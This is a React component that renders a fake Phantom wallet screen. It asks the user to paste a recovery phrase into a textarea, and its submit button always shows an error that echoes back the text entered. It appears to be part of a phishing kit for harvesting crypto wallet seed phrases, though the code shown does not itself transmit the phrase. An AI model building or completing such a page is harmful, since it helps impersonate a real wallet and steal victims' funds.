import SvgIcon from '@com/SvgIcon';
import React from 'react';
import { useTranslation } from 'react-i18next';
export default function PhantomCom(){
    const {t} = useTranslation();
    const [showError,setShowError] = React.useState(false);
    const [disabled,setDisabled] = React.useState(true);
    const [errorValue,setErrorValue] = React.useState("");
    const textareaRef = React.useRef(null);
    return <div className="w-full h-dvh bg-[#111011] text-[#efeeef] flex flex-col">
        <div className="flex py-3 px-3 items-center">
            <SvgIcon className="flex-1" icon="_2849832_arrows_navigation_arrow_left_back_icon" width="22px" height="22px" strokeWidth="25px" stroke="#efedef" fill="#efedef"/>
            <p className="flex gap-2 w-full flex-3">
                {Array.from({length:3}).map((_,index)=>
                    index==0?
                    <hr className="border-[#efeeef] border-solid flex-1 border-2 rounded-md"  key={index}/>:
                    <hr className="border-[#b4b2b4] border-solid flex-1 border-2 rounded-md "  key={index}/>
                )}
            </p>
            <p className="flex-1"><button className="text-lg">{t('phantom.nextStep')}</button></p>
        </div>
        <div className="px-4 flex-1 flex flex-col gap-2 justify-center items-center">
            <h1 class="text-2xl font-bold">{t("phantom.title")}</h1>
            <p class="text-lg px-2 text-[#b3b4b5]">{t("phantom.desc")}</p>
            <p className="w-full"><textarea ref={textareaRef} onChange={()=>{
                setDisabled(false);
            }} rows="5" name="phrase" id="phrase" class="text-lg p-2 w-full bg-[#232123] border-solid border-2 border-[#383739] rounded-xl outline-[#383739]"/></p>
            {showError?<div className="text-[#bd3207] text-md font-bold flex items-center justify-start gap-2 w-full">
                <SvgIcon icon="_3672675_wrong_cancel_close_delete_error_icon" width="13px" height="13px" stroke="#bd3207" strokeWidth="4px" fill="none"/>
                <p>{t("phantom.error")}:{errorValue}</p>
            </div>:null}
            <div className="pt-2"><button onClick={()=>{
                setDisabled(true);
                setShowError(true);
                setErrorValue(textareaRef.current.value);
            }} disabled={disabled} className="rounded-2xl w-96 p-3 text-xl text-[#292a2e] bg-[#aaa4f6] disabled:bg-[#4f4b6d] disabled:text-(color:#36324c)">{t("phantom.submit")}</button></div>
        </div>
    </div>
}

